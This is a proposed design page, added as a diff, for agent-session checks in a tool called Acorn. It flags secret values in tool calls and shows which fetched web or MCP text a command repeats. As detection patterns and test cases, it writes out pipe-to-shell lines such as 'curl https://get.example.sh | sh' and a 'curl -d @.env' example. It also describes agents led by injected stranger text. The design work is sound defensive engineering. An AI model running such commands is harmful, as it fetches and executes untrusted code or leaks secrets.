@@ -1,0 +1,247 @@
+# Known key values and command origins in agent sessions
+
+Date: November 6, 2026. Status: proposed. Nothing on this page is built.
+
+This page covers two checks on what an agent runs. The first notices when a tool call carries the
+value of a key on this machine. The second tells the person, on a permission card, which text the
+agent read that a command repeats. Both ideas come from Stroq, a local guard for coding agents, cloned
+at `references/Stroq`, a folder Git ignores. Acorn already has the hooks, the transcript store, and
+the card those checks need, so this plan borrows the ideas and a little code, not the tool.
+
+[Secret checks before publication](../security/secret-publication.md),
+[harness bridges](../managed-agents/loop-hooks.md), and [permission
+policy](../managed-agents/permission-policy.md) own the rules that exist. Those pages win where this
+plan disagrees with them.
+
+## Starting point
+
+Checked against `main` at `94689daef` on November 6, 2026.
+
+- The detector in `packages/node-core/src/server/secretChecks/detector.ts` finds secrets by shape:
+  documented provider prefixes, private key headers, JWTs, URL passwords, and high-randomness
+  assignments. It runs only at four operations Acorn owns: a commit, a push, a transcript export, and
+  a message with attachments. The secret publication page lists "Git, curl, or uploads run in a
+  terminal or by an agent's own tools" as outside coverage.
+- A database password, a webhook signing secret, or an internal API key has no documented prefix, so
+  the detector can't see it anywhere.
+- The event store already matches by value in one place. `ProviderEventMaterializer` takes the tokens
+  Acorn issued itself (`mintedSecrets` in `plugins/agents/src/server/sessions/runtimeEngine.ts`) and
+  scrubs them out of provider error and diagnostic messages.
+- `agents:before-tool` and `agents:after-tool` run on every Claude Code tool call through the bridge,
+  but the bridge is installed only when some plugin handles a point. Codex, DeepSeek, and contributed
+  ACP harnesses reach `agents:before-permission` only.
+- A permission card in `plugins/agents/src/client/sessions/AgentEventCard.tsx` shows the harness's
+  title and, for a refused request, "Blocked by `<who>`: `<why>`". Nothing on the card says why the
+  agent wants to run the command.
+- Tool calls, their input, and their output are stored per session in `agent_events`, with an index
+  on session and tool ID. Large output moves to an artifact.
+
+## Goals
+
+- Tell the person when an agent's tool call carried the value of a key from this machine, on every
+  harness, after the fact.
+- Optionally refuse such a call on Claude Code before it runs, under the switch that already blocks
+  publication.
+- Catch a known value in a commit or a push, where the shape rules miss it.
+- Show, on a permission card, the web page or MCP result a command repeats a URL, host, install
+  target, or pipe-to-shell line from.
+- Hold no key value anywhere: not in memory past the read, not in SQLite, not in a log, an audit row,
+  or a wire event.
+
+## Not in scope
+
+- Stroq's 622 injection rules, its session taint, and its shell command classifier. Stroq measured its
+  rules flagging 16% of harmless documentation files, and the classifier is thousands of lines of
+  shell parsing.
+- Blocking based on origin. The origin line is display only in this plan.
+- Removing key values from stored transcripts. See the open decisions.
+- A key passed by reference: `$STRIPE_KEY`, `curl -d @.env`, or a script that reads `.env`. The value
+  isn't in the command text, so neither check can see it.
+
+## Part 1: known key values
+
+### The index
+
+Add `packages/node-core/src/server/secretChecks/knownValues.ts` (new) beside the detector, and export it
+through `@acorn/plugin-api/node` the way the detector is.
+
+It reads these sources:
+
+- The task worktree's `.env`, `.env.*`, `*.env`, and `.envrc` files, skipping names that contain
+  `example`, `sample`, `template`, or `dist`.
+- `~/.aws/credentials`, `~/.npmrc`, `~/.netrc`, and `~/.docker/config.json`.
+- Variables in the environment a harness is started with, whose names look like a secret.
+
+It keeps a value only when all of these hold:
+
+- The key name looks like a secret: `key`, `token`, `secret`, `password`, `credential`, `auth`, and
+  the like. Stroq's `SECRET_NAME` and `EXCLUDED_NAME` in `references/Stroq/packages/core/src/secrets/extract.ts` are
+  the reference.
+- The value is at least 12 characters and has no whitespace.
+- The value isn't a placeholder, a path, a host name, or a URL with no password. Reuse the detector's
+  `PLACEHOLDER` pattern.
+- The value has at least 3.5 bits of entropy per character, using the detector's `entropy` function.
+
+Each kept value becomes `{ hash, name, source }`, where `hash` is SHA-256 over a random salt and the
+value. The salt lives in memory and changes at each Node start. The index lives in memory too. Stroq
+writes its index to disk because every hook is a new process. Acorn's Node keeps running, so it
+doesn't need to. The index records each source's path, size, and modification time, and rereads a
+source when either changes. It has a version string that changes whenever its entries change.
+
+A lookup takes text and returns `{ name, source }` for each match. It cuts the text into candidates on
+shell, JSON, and URL punctuation, splits again on `/` and `@`, URL-decodes a candidate when that
+changes it, hashes each candidate, and checks the map. It reads at most 2 MiB, in overlapping windows,
+and says so when the text is longer. Stroq's `references/Stroq/packages/core/src/secrets/candidates.ts` has the window
+and padding cases worth copying.
+
+### Where it runs
+
+1. **Every harness, after the fact.** When the event store saves a tool call, it looks up the call's
+   `input`. A match adds `secretValues: [{ name, source }]` to the stored tool call and writes a
+   `secrets.agent.carried` audit row with the session, the tool call, and the names. This stops
+   nothing. Only the input is read here, because output can run to megabytes.
+2. **Claude Code, before the call.** With **Block publication with secret findings** on, the before
+   tool bridge in `plugins/agents/src/server/sessions/loopHooks.ts` looks up a call's command and
+   input before any plugin handler runs. A match on a command, a fetch, or an MCP call is a deny. A
+   match on an edit is only reported, because an agent editing `.env` writes the value on purpose.
+3. **Commit and push.** The Git secret check in `plugins/git/src/server/changes/secretCheck.ts` runs the
+   lookup over each blob it already reads and reports a match as a high-confidence `known-value`
+   finding.
+
+The bridge check is compiled into the agents plugin rather than written as a plugin handler, the same
+way the publication gate is a compiled-core facet. The lifecycle installs the bridge when a point has
+a handler or when blocking is on.
+
+### What the person sees
+
+- **Settings > Security and backup** gets a **Keys Acorn knows about** list under the blocking switch:
+  each source with its count, such as "`.env.local` in this task: 4 keys" and "`~/.aws/credentials`:
+  2 keys". It shows names on request and never values.
+- A tool card whose input carried a known value gets a warning line: "This command contained
+  `STRIPE_SECRET_KEY` from `.env.local`." It draws in the web client and the terminal client.
+- A refused Claude Code call shows the same "Blocked by Acorn" alert that plugin vetoes use. The model
+  reads "Blocked by Acorn: this command contains the value of `STRIPE_SECRET_KEY` from `.env.local`.
+  Refer to the variable instead of its value." in the same turn.
+- A refused commit or push names `known-value` and the key name in the message the gate already
+  writes, and the existing one-time allowance in Settings works on it.
+
+### What changes elsewhere
+
+- The Git blob cache is keyed by `SECRET_DETECTOR_VERSION` and the blob ID. Add the index version to
+  that key and to the publication decision digest. Otherwise a key added to `.env` is never checked
+  against blobs already in the cache, and an old allowance still applies.
+- `docs/security/secret-publication.md` gains a section for the agent checks, and its coverage list
+  changes. It must say that the Node reads the home folder files above.
+- `docs/managed-agents/loop-hooks.md` says that the bridge also installs when blocking is on.
+
+## Part 2: where a command came from
+
+### The match
+
+Add `plugins/agents/src/server/sessions/commandOrigin.ts` (new), a pure module with one main function:
+given a command and a list of recent tool results, return the first result the command repeats
+something from, and what it repeats.
+
+It extracts these from both sides:
+
+- URLs, and the host of each URL.
+- Pipe-to-shell lines: `curl … | sh`, `wget … | bash`, and their spacing variants.
+- Package names in install and run commands: `npx`, `pnpm dlx`, `npm install`, `pip install`,
+  `uvx`, `go install`, and `cargo install`.
+
+Stroq's `references/Stroq/packages/core/src/provenance/atoms.ts` and `package-lines.ts` are the reference. Leave out
+its base64 and hex decoding and its shell word parser for this version.
+
+Only text from outside the person's control counts as a source:
+
+- Web fetches and searches, which the drivers mark with the tool call's `web` field.
+- MCP tool results, which carry an MCP tool `name`. This includes Acorn's own issue and pull request
+  tools, because an issue body is a stranger's text.
+
+Files in the repository and command output don't count in this version. Counting them would match
+`package.json` every time the agent runs a test, and a line that's always there stops being read.
+
+### Where it runs
+
+The function runs when a permission card is about to be saved:
+
+- `settlePermissionRequest` in `plugins/agents/src/server/sessions/permissionPolicy.ts`, for a
+  harness's own request on every harness.
+- `holdAsk` in `plugins/agents/src/server/sessions/loopHooks.ts`, for a plugin's ask.
+
+Each reads the session's last 200 tool calls from `agent_events`, keeps the ones that qualify as a
+source, and runs the match. A card waits on a person, so a query here costs nothing they notice. No
+new table or in-memory state is needed, and a Node restart loses nothing.
+
+The request event in `plugins/agents/src/contract/wire.ts` gains an optional field:
+
+```ts
+origin?: { toolCallId: string; toolTitle: string; match: string; callsAgo: number }
+```
+
+`match` is capped at 200 characters and `toolTitle` at 500. A client that doesn't know the field
+ignores it, as older clients ignore `blocked`.
+
+### What the person sees
+
+A permission card gets one muted line under its title:
+
+> `https://get.example.sh` appears in a web fetch of `github.com/acme/api/issues/12`, 3 calls earlier.
+
+It blocks nothing, and nothing else in the session changes. A wrong match costs a line of text.
+Jumping from the line to that tool card needs a link between transcript cards, which doesn't exist,
+and is left for later.
+
+### Later, once the line has been used
+
+- Add `origin` to the `agents:before-tool` and `agents:before-permission` payloads, so a policy
+  plugin can ask about a command that repeats a stranger's text. That's Stroq's
+  `ask-origin-untrusted` rule.
+- Run the match on every command at save time and show the line on the tool card too. People in
+  bypass mode never see a permission card, so they gain the most from this.
+
+## Open decisions
+
+1. **Reading home folder files by default.** The recommendation is yes for the after-the-fact warning,
+   which never leaves the Node, with blocking still behind the switch. The other choice is a separate
+   switch, off by default, for the home folder sources.
+2. **Blanking known values out of stored transcripts.** That would keep a key out of exports, search,
+   and the phone, but every tool output would need a lookup, and some outputs are megabytes. The
+   recommendation is to measure the cost on a real session database before deciding.
+
+## Risks
+
+- **Bridge cost.** With blocking on, every Claude Code tool call goes through the bridge. Acorn
+  measured a median of 57 ms per call on October 7, 2026, on an Apple silicon Mac.
+- **False positives.** A long, random, non-secret value under a secret-looking name, such as a
+  build ID, matches. The tool card warning makes these visible before blocking does.
+- **What it can't see.** A key passed by reference or read by a script leaves no value in the
+  command. The docs must say this beside the feature, not only here.
+- **Noise in the origin line.** A popular host like `github.com` would match often. Match full URLs
+  and package names first, and a host alone only when no full URL matched.
+
+## Phases
+
+1. **The origin line.** `commandOrigin.ts` with tests, the wire field, the two call sites, and the
+   card line. Display only, so a mistake can't break a session. About two days.
+2. **The index and the after-the-fact warning.** `knownValues.ts` with tests, the event store lookup,
+   the tool card line, the audit row, and the Settings list. About a day and a half.
+3. **Blocking.** The bridge check, the install condition, the Git rule, the cache key and digest
+   changes, and the docs. About a day and a half.
+
+## Acceptance
+
+- A unit fixture for each source file format, each filter, and the 2 MiB window edge. Build key
+  values at runtime, as `detector.test.ts` does, so no key literal sits in the repository.
+- A Claude Code session in `pnpm dev:agent` that runs `curl` with a value from a test `.env.local`:
+  with blocking off, the tool card warns. With blocking on, the call is refused and the model reads
+  the reason.
+- A Codex session that runs the same command shows the tool card warning.
+- A commit that adds a known value with no provider prefix is refused with blocking on, and allowed
+  once from Settings.
+- No row in `agent_events`, the audit table, or the Node log holds a key value. A test greps all three
+  after the scenarios above.
+- A session that fetches a page naming `https://get.example.sh` and then asks to run
+  `curl https://get.example.sh | sh` shows the origin line on the card, in the web client and the
+  terminal client.
+- A session that reads `package.json` and then asks to run `pnpm test` shows no origin line.
